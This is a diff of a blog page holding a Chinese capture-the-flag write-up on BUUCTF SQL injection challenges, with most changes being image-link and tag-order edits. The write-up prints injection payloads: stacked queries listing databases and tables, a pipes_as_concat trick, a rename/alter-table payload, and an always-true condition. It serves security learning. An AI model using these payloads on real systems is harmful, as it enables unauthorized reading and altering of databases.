@@ -169,7 +169,7 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h1 id="3-25-wp"><a href="#3-25-wp" class="headerlink" title="3.25 wp"></a>3.25 wp</h1><h3 id="buuctf-2019-easysql"><a href="#buuctf-2019-easysql" class="headerlink" title="buuctf 2019 easysql"></a><strong>buuctf 2019 easysql</strong></h3><p><strong>输入1，回显</strong></p>
-<p><strong><img src="/.com//image-20220326154714237.png" alt="image-20220326154714237"></strong></p>
+<p><strong><img src="https://note.youdao.com/yws/api/personal/file/WEBb94b5dd4e028db127a53868b2669d081?method=download&shareKey=3870a398e3970a1fff9ad0531d94cc9c" alt="image-20220326154714237"></strong></p>
 <p><strong>输入1‘，无回显</strong></p>
 <p><strong>输入1‘ order by 1#                                  nonono</strong></p>
 <p><strong>输入1 and length(database())&gt;&#x3D;1#       nonono</strong></p>
@@ -181,11 +181,11 @@
 <li><strong>1;show databases;#</strong></li>
 </ol>
 <p><strong>没有nonono</strong></p>
-<p><strong><img src="/.com//image-20220326155126987.png" alt="image-20220326155126987"></strong></p>
+<p><strong><img src="/.com//WEB6a8acad86f0c905f9a1c17d3cad5cfe8-16484673538861" alt="image-20220326155126987"></strong></p>
 <ol start="2">
 <li><strong>1;show tables;#  表</strong></li>
 </ol>
-<p><strong><img src="/.com//image-20220326155241139.png" alt="image-20220326155241139"></strong></p>
+<p><strong><img src="https://note.youdao.com/yws/api/personal/file/WEB8e456c020345bcb2c3d0cc6b8e61f223?method=download&shareKey=29ebc61840d24469eca22b3afac2d201" alt="image-20220326155241139"></strong></p>
 <ol start="3">
 <li><strong>1;show columns from Flag;#</strong></li>
 </ol>
@@ -204,7 +204,7 @@
 <p><strong>也就是</strong></p>
 <p>*<em>select <em>,1 from Flag</em></em></p>
 <p><strong>也就是直接查询出了Flag表中的所有内容</strong></p>
-<p><strong><img src="/.com//image-20220326160747096.png" alt="image-20220326160747096"></strong></p>
+<p><strong><img src="https://note.youdao.com/yws/api/personal/file/WEB991db8f851379f10a291a0b82c239084?method=download&shareKey=08a39fc5da50e152c106e8308367cf37" alt="image-20220326160747096"></strong></p>
 <p><strong>解法2</strong><br> <strong>输入的内容为</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="built_in">set</span> sql_mode=pipes_as_concat;select 1</span><br></pre></td></tr></table></figure>
 
@@ -214,7 +214,7 @@
 
 <p><strong>启用PIPES_AS_CONCAT SQL模式后，|| 用作<code>CONCAT()</code>函数的同义词，即字符串串联函数。</strong></p>
 <p><strong>读出flag</strong></p>
-<p><strong><img src="/.com//20200430180147681.png" alt="在这里插入图片描述"></strong></p>
+<p><strong><img src="https://note.youdao.com/yws/api/personal/file/WEB3486e67f6458292c60b9f028d93abf02?method=download&shareKey=4f2f59061c0fae38c601267220ffd6cf" alt="在这里插入图片描述"></strong></p>
 <p>最后的不是很懂，<strong>好难</strong></p>
 <p><strong>版权声明：本文为CSDN博主「一只小白来了」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。</strong><br><strong>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44866139/article/details/105857487">https://blog.csdn.net/weixin_44866139/article/details/105857487</a></strong></p>
 <h4 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h4><p>输入1‘报错</p>
@@ -234,27 +234,27 @@
 <p>报错</p>
 <p>说明有2列</p>
 <p>-1 union select 1,2</p>
-<p><img src="/.com//image-20220326163747524.png" alt="image-20220326163747524"></p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB2a09f8092641410d3765d08c771b7dc2?method=download&shareKey=6fbaf63918993d7271089e7b558b4f76" alt="image-20220326163747524"></p>
 <p>过滤了 select，update，delete，drop，insert，where 和 .</p>
 <p>联合注入不能用</p>
 <p>考虑上一题的堆叠</p>
-<p><img src="/.com//image-20220326163932232.png" alt="image-20220326163932232"></p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB10e13988882dcc396f1d2a5e46aa6c5b?method=download&shareKey=b25602210c1d96c87892479d0b4d6aeb" alt="image-20220326163932232"></p>
 <p>有了</p>
 <p>查看表</p>
 <p>1’;show tables;#</p>
-<p><img src="/.com//image-20220326164025900.png" alt="image-20220326164025900"></p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB4fe1fb9cdbf327d8eecb2dfd538e1169?method=download&shareKey=28133b984200d851c3c5781c91776eae" alt="image-20220326164025900"></p>
 <p>两个表</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; show columns from `words`; #</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.com//image-20220326164155676.png" alt="image-20220326164155676"></p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB2c7ea45c9a76d5e8807cce58084032c6?method=download&shareKey=b25360050daca8f4aa882bd67d2c84f8" alt="image-20220326164155676"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; show columns from `1919810931114514`; #</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.com//image-20220326164307289.png" alt="image-20220326164307289"></p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB70ff11734d8581326053b938832a7d31?method=download&shareKey=2b221f49ee906a1a6eb97ad70d4d6a0c" alt="image-20220326164307289"></p>
 <p>问大佬</p>
 <p>有两张表，回显内容是从word这张表中回显的，那我们怎么才能让它回显flag所在的表呢<br>内部查询语句类似 :<code>select id, data from word where id =</code></p>
 <p>他既然没过滤 alert 和 rename，那么我们是不是可以把表改个名字，再给列改个名字呢。<br> 先把 words 改名为 words1，再把这个数字表改名为 words，然后把新的 words 里的 flag 列改为 id （避免一开始无法查询）。<br> <strong>payload:</strong><br>0’;rename table words to words1;rename table <code>1919810931114514</code> to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;#</p>
 <p>再输入1’ or ‘1’&#x3D;’1 #就可以了</p>
-<p><img src="/.com//image-20220326165043026.png" alt="image-20220326165043026"></p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEBa8a6585ad74268e13da8976168b80d6f?method=download&shareKey=f0f39e4ceaf06763de26f0ae6576957a" alt="image-20220326165043026"></p>
 <p>大佬提示：</p>
 <p><strong>坑点：mysql中点引号( ‘ )和反勾号( &#96; )的区别</strong></p>
 <figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">linux下不区分，windows下区分</span><br><span class="line">区别:</span><br><span class="line">单引号( &#x27; )或双引号主要用于字符串的引用符号</span><br><span class="line">eg：mysql&gt; SELECT <span class="symbol">&#x27;hello</span>&#x27;, <span class="string">&quot;hello&quot;</span> ;</span><br><span class="line"></span><br><span class="line">反勾号( ` )主要用于数据库、表、索引、列和别名用的引用符是[Esc下面的键]</span><br><span class="line">eg:`mysql&gt;SELECT * FROM   `table`   WHERE `from` = <span class="symbol">&#x27;abc</span>&#x27; ;</span><br></pre></td></tr></table></figure>
@@ -1257,15 +1257,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">wp</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">flask</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">http</a>
+                <a href="javascript:void(0)" class="js-tag color4">html css</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">html css</a>
+                <a href="javascript:void(0)" class="js-tag color5">http</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1278,10 +1282,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">寄</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">wp</a>
               </li>
             
             <div class="clearfix"></div>
